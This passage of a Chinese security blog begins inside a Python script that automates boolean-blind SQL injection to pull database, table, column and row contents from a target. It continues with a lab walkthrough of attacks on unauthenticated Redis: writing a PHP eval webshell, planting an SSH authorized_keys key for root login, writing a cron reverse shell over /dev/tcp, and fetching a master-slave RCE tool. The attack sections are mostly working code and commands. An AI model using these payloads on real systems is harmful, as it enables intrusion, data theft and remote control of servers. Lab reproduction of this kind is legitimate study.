dbNameLen == <span class="number">30</span>:          </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)       </span><br><span class="line">        <span class="keyword">break</span>                <span class="comment"># 30次判断仍不对则则报错</span></span><br><span class="line">    dbNameLen += <span class="number">1</span></span><br><span class="line">dbName = <span class="string">&quot;&quot;</span>              <span class="comment"># 定义为空字符串,方便后面将符合条件的字母填入该字符串中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜解库名</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dbNameLen+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">        dbName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr(database(),&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1))=&#x27;&quot;</span>+<span class="built_in">str</span>(a)+<span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line">        <span class="comment"># 拼接URL,变量是substr的第2个参数,有两处需要拼接的地方</span></span><br><span class="line">        <span class="built_in">print</span>(dbName_url)</span><br><span class="line">        <span class="comment"># 每次拼接完成后看看效果,测试有没有拼接错</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dbName_url).text) == normalHtmlLen:</span><br><span class="line">            dbName += <span class="built_in">chr</span>(a)</span><br><span class="line">            <span class="comment"># 将符合的字母填充到预先设计好的空字符串中</span></span><br><span class="line">            <span class="built_in">print</span>(dbName)</span><br><span class="line">            <span class="keyword">break</span><span class="comment"># 结束的是单次的内部循环,不能结束外部循环</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断表名数量、各个表名长度并猜解表名</span></span><br><span class="line">sheNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sheNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(*)table_name from information_schema.tables where table_schema=&#x27;security&#x27;)=&quot;</span> +<span class="built_in">str</span>(sheNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">    <span class="comment"># COUNT(*) 函数返回在给定的选择中被选的行数</span></span><br><span class="line">    <span class="built_in">print</span>(sheNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of sche:&quot;</span>+<span class="built_in">str</span>(sheNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> sheNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    sheNum += <span class="number">1</span></span><br><span class="line"><span class="comment"># 这部分猜解表的数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来是判断表名长度并猜解表名</span></span><br><span class="line">sheNames=<span class="string">&quot;&quot;</span>              <span class="comment"># 最后输出所以表名用，定义为空字符串,方便后面将符合条件的字母填入该字符串中</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, sheNum):</span><br><span class="line">    sheNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sheNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(sheNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">       </span><br><span class="line">        <span class="built_in">print</span>(sheNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of schename&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(sheNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> sheNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sheNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜解表名        </span></span><br><span class="line">    sheName = <span class="string">&quot;&quot;</span>    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, sheNameLen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">            sheName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(sheName_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(sheName_url).text) == normalHtmlLen:</span><br><span class="line">                sheName += <span class="built_in">chr</span>(y)</span><br><span class="line">                <span class="built_in">print</span>(sheName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    sheNames+=sheName+<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;database: &quot;</span>+dbName)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tabales: &quot;</span>+sheNames)</span><br><span class="line"><span class="comment"># 库名表名猜解完成</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#猜解列名</span></span><br><span class="line">database = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的数据库: &quot;</span>)</span><br><span class="line">table_name = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的表: &quot;</span>)</span><br><span class="line"><span class="comment"># 可选择要查的表</span></span><br><span class="line"></span><br><span class="line">colNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    colNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(column_name) from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27;)=&quot;</span> +<span class="built_in">str</span>(colNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># COUNT函数返回在给定的选择中被选的行数</span></span><br><span class="line">    <span class="built_in">print</span>(colNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of col:&quot;</span>+<span class="built_in">str</span>(colNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> colNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    colNum += <span class="number">1</span></span><br><span class="line"><span class="comment"># 这部分猜解列的数量</span></span><br><span class="line"></span><br><span class="line">colNames=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, colNum):</span><br><span class="line">    colNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        colNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(column_name) from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(colNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(colNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of colname&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(colNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> colNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        colNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    colName = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, colNameLen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            colName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;&quot;</span> + database +<span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + table_name + <span class="string">&quot;&#x27; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(colName_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(colName_url).text) == normalHtmlLen:</span><br><span class="line">                colName += <span class="built_in">chr</span>(y)</span><br><span class="line">                <span class="built_in">print</span>(colName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    colNames+=colName+<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;columns: &quot;</span> + colNames)</span><br><span class="line"><span class="comment"># 猜解列名完成</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#拿数据</span></span><br><span class="line">table_name=<span class="built_in">input</span>(<span class="string">&quot;请输入要查找的表: &quot;</span>)</span><br><span class="line">column_name=<span class="built_in">input</span>(<span class="string">&quot;请输入要查找的列：&quot;</span>)</span><br><span class="line"><span class="comment">#可选择要查的列</span></span><br><span class="line"></span><br><span class="line">dataNum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dataNum_url = url + <span class="string">&quot;?id=1&#x27; and (select count(&quot;</span> + column_name + <span class="string">&quot;) from &quot;</span> + table_name + <span class="string">&quot;)=&quot;</span> +<span class="built_in">str</span>(dataNum) + <span class="string">&quot; --+&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(dataNum_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataNum_url).text) == normalHtmlLen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The num of data:&quot;</span>+<span class="built_in">str</span>(dataNum))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> dataNum == <span class="number">30</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    dataNum += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">dataNames=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, dataNum):</span><br><span class="line">    dataNameLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        dataNameLen_url = url + <span class="string">&quot;?id=1&#x27; and (select length(&quot;</span> + column_name + <span class="string">&quot;) from &quot;</span> + table_name + <span class="string">&quot; limit &quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                i) + <span class="string">&quot;,1)=&quot;</span> + <span class="built_in">str</span>(dataNameLen) + <span class="string">&quot; --+&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(dataNameLen_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataNameLen_url).text) == normalHtmlLen:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The len of dataname&quot;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(dataNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> dataNum == <span class="number">30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        dataNameLen += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    dataName = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dataNameLen+<span class="number">1</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="comment"># 表示在ascii表的33～126位可显示字符</span></span><br><span class="line">            dataName_url = url + <span class="string">&quot;?id=1&#x27; and ascii(substr((select &quot;</span> + column_name + <span class="string">&quot; from &quot;</span> + table_name + <span class="string">&quot; limit &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                    x) + <span class="string">&quot;,1))=&#x27;&quot;</span> + <span class="built_in">str</span>(y) + <span class="string">&quot;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span> (dataName_url)</span><br><span class="line">           </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(requests.get(dataName_url).text) == normalHtmlLen:</span><br><span class="line"></span><br><span class="line">                dataName += <span class="built_in">chr</span>(y)</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(dataName)</span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    dataNames += dataName + <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;datas: &quot;</span> + dataNames)</span><br></pre></td></tr></table></figure><p><strong>运行测试：</strong></p><p><img src="http://pic.bamboo22.top/image-20230507182521766.png"><br><img src="http://pic.bamboo22.top/image-20230507182613115.png"><br><img src="http://pic.bamboo22.top/image-20230507182736100.png"></p>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Redis的几种利用方法</title>
      <link href="/2024/01/22/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2024/01/22/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Redis的几种利用方法"><a href="#Redis的几种利用方法" class="headerlink" title="Redis的几种利用方法"></a>Redis的几种利用方法</h1><h2 id="什么是redis"><a href="#什么是redis" class="headerlink" title="什么是redis"></a>什么是redis</h2><p>Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivota赞助。</p><h2 id="redis漏洞原理"><a href="#redis漏洞原理" class="headerlink" title="redis漏洞原理"></a>redis漏洞原理</h2><p>Redis默认情况下是绑定在0.0.0.0:6379端口的，如果没有设置密码（一般密码为空）或者密码为弱密码的情况下并且也没有进行有效保护措施，那么处于公网的redis服务就会被任意的用户未授权访问，读取数据，甚至利用redis自身的命令，进行写入文件操作，这样就会恶意攻击者利用redis未授权漏洞进行进一步攻击。</p><h2 id="redis安装"><a href="#redis安装" class="headerlink" title="redis安装"></a>redis安装</h2><p>这里使用的是<strong>kali</strong>和<strong>Ubuntu</strong></p><p><strong>kali下安装：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一步 wget http://download.redis.io/releases/redis-2.8.17.tar.gz#下载redis</span><br><span class="line">第二步 tar xzf redis-2.8.17.tar.gz#解压安装包</span><br><span class="line">第三步 cd redis-2.8.17 #进入redis文件夹</span><br><span class="line">第四步 make #在redis-2.8.17文件夹下执行make</span><br><span class="line">第五步 cd src#进入redis-2.8.17文件夹下的src文件夹</span><br><span class="line">第六步 cp redis-server /usr/bin</span><br><span class="line">第七步 cp redis-cli /usr/bin #将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</span><br><span class="line">第八步 cp redis-conf /etc/ #返回目录redis-2.8.17，将redis.conf拷贝到/etc/目录下</span><br><span class="line">第九步 redis-server /etc/redis.conf #使用/etc/目录下的reids.conf文件中的配置启动redis服务</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在redis-2.8.17目录下redis-server开启</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230608170325020.png"></p><p><strong>Ubuntu下安装：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://download.redis.io/releases/redis-2.8.4.tar.gz</span><br><span class="line">$ tar xzf redis-2.8.4.tar.gz</span><br><span class="line">$ cd redis-2.8.4</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">拷贝关键文件</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line">cd src</span><br><span class="line">cp redis-benchmark redis-cli redis-server /usr/bin/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">启动</span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230608170601093.png"></p><h2 id="redis漏洞复现"><a href="#redis漏洞复现" class="headerlink" title="redis漏洞复现"></a>redis漏洞复现</h2><p><strong>注意这里的攻击机是kali，手受害机是Ubuntu</strong></p><h3 id="1-未授权访问"><a href="#1-未授权访问" class="headerlink" title="1.未授权访问"></a>1.未授权访问</h3><p>Ubuntu打开redis服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p><img src="https://pic.bamboo22.top/image-20230608215752374.png"></p><p>kali这边无密码登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.144.130</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230608215723959.png"></p><h3 id="2-利用redis漏洞写webshell"><a href="#2-利用redis漏洞写webshell" class="headerlink" title="2.利用redis漏洞写webshell"></a>2.利用redis漏洞写webshell</h3><p><strong>利用前提：</strong></p><ul><li><p>靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</p></li><li><p>开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（开启web服务器，就可以利用url使用蚁剑进行连接）</p></li></ul><p><strong>上传webshell:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">config get dir #查看redis数据库路径</span><br><span class="line">config set dir /tmp #修改靶机Redis数据库路径</span><br><span class="line">config set dbfilename</span><br><span class="line">config set dbfilename 22.php #生成22.php文件</span><br><span class="line">set webshell &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;#将一句话木马写入文件中</span><br><span class="line">#&quot;\r\n\r\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span><br><span class="line">save#保存</span><br><span class="line">set webshell &quot;\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n\r\n&quot;#上传木马可以通过蚁剑连接</span><br><span class="line">save#保存</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230608222941674.png"></p><p>可以看到shell已经被写入</p><p><img src="http://pic.bamboo22.top/image-20230608222706342.png"></p><h3 id="3-利用公私钥获取root权限"><a href="#3-利用公私钥获取root权限" class="headerlink" title="3.利用公私钥获取root权限"></a>3.利用公私钥获取root权限</h3><p><strong>ssh秘钥连接：</strong></p><p>大家都知道可以通过ssh远程登录另外一台电脑。ssh登录有两种一个是密码登录，一个是密钥登录，我们主要看密钥登录是什么流程，公钥登录是为了解决每次登录服务器都要输入密码的问题，流行使用RSA加密方案，主要流程包含：</p><ol><li>客户端生成RSA公钥和私钥</li><li>客户端将自己的公钥存放到服务器</li><li>客户端请求连接服务器，服务器将一个随机字符串发送给客户端</li><li>客户端根据自己的私钥加密这个随机字符串之后再发送给服务器</li><li>服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。这样就不用使用密码了。</li></ol><p><strong>前提：</strong></p><ol><li><strong>当redis以root身份运行</strong>。</li><li>靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证。</li><li>存在&#x2F;root&#x2F;.ssh目录，如果不存在我们可以通过一句话木马连接蚁剑创建目录不过可能进不去root目录权限问题可能或者自己mkdir一个目录毕竟是自己搭建靶场。因为.ssh是隐藏目录可以通过ls -la查看有没有。</li></ol><p><strong>操作：</strong></p><p>靶机:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf    #开启redis服务</span><br><span class="line">mkdir /root/.ssh                #创建ssh公钥存放目录（靶机是作为ssh服务器使用的）</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609172912345.png"></p><p><img src="http://pic.bamboo22.top/image-20230608224252809.png"></p><p>攻击机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa   #生成ssh私钥和公钥，密码为空</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609163032554.png"></p><p><strong>攻击机：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd .ssh/          #进入.ssh目录</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; 1.txt  #将生成的公钥保存到1.txt：</span><br><span class="line">cat 1.txt | redis-cli -h 192.168.144.130 -x set crack   #连接靶机的Redis，将刚生成的公钥1.txt写入redis</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609163327360.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.144.130   #攻击机连接靶机redis：</span><br><span class="line">使用 config get dir 命令得到redis备份的路径，更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）并设置上传公钥的备份文件名字为authorized_keys：</span><br><span class="line">config get dir</span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609164013668.png"></p><p>如果出现<code>(error) ERR Changing directory: Permission denied</code>，则说明redis没有以root权限运行，注意攻击机、靶机都要以root权限运行</p><p><img src="http://pic.bamboo22.top/image-20230609164103222.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用ssh免密登录到靶机：ssh -i id_rsa root@192.168.144.130</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609172036593.png"></p><p>成功登录靶机root账户</p><p>我在复现的时候最后一步遇到这个问题</p><p><img src="http://pic.bamboo22.top/image-20230609172200320.png"></p><p>这个问题是因为靶机没又开启ssh-server，参考大佬解决方案<a href="http://t.csdn.cn/9boV8">ssh提示Connection refused的解决方案</a></p><h3 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h3><h4 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h4><p>在攻击者服务器上监听一个端口（未被占用的任意端口）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>连接redis，写入反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.144.130</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.144.130/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">#前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230609220933226.png"></p><p><img src="http://pic.bamboo22.top/image-20230609220828144.png"></p><p>可以看到已经成功写入反弹信息，但是还是无法反弹shell，这个问题应该是利用redis未授权访问写的任务计划文件都有乱码，这是乱码来自redis的缓存数据，这个问题无法解决的。centos会忽略乱码去执行格式正确的任务计划，而ubuntu和debian并不会忽略这些乱码，所以导致命令执行失败。试了很多次都没有执行成功。</p><h4 id="利用redis主从复制反弹shell"><a href="#利用redis主从复制反弹shell" class="headerlink" title="利用redis主从复制反弹shell"></a>利用redis主从复制反弹shell</h4><p><strong>redis主从复制：</strong></p><p>redis主从复制我们简单理解为有两台redis服务器,一个是主，一个是从，两台服务器的数据是一样的，主服务器负责写入数据，从服务器负责读取数据。一般一个主服务器有好几个从服务器，且从服务器可能也是其他redis服务器的主服务器。这样的好处就是如果主服务器或者一个从服务器崩溃不会影响数据完整性，且读写分开，减轻服务器压力。</p><p><strong>操作：</strong></p><p>如果要是的利用成功需要先下载攻击代码，这里还有注意如果利用redis主从复制redis版本要是4.x或者5.x,因为我都kali里有docker，所以用Ubuntu攻击kali</p><p><strong>拉取镜像</strong></p><p>首先拉取一个5.0镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search redis5.0    //查找镜像</span><br><span class="line">docker pull damonevking/redis5.0   //拉取下图第三个镜像</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230611223902216.png"></p><p><img src="http://pic.bamboo22.top/image-20230611223944013.png"><br><strong>运行容器</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 6379:6379 -d damonevking/redis5.0 redis-server   //映射端口并运行容器</span><br></pre></td></tr></table></figure><p>访问你的ip+6379端口，如下图则说明搭建成功</p><p><img src="http://pic.bamboo22.top/1200.png"></p><p><strong>漏洞利用：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Ridter/redis-rce.git   //下载漏洞利用脚本</span><br></pre></td></tr></table></figure><p>注意，这里少一个.so的文件，到<a 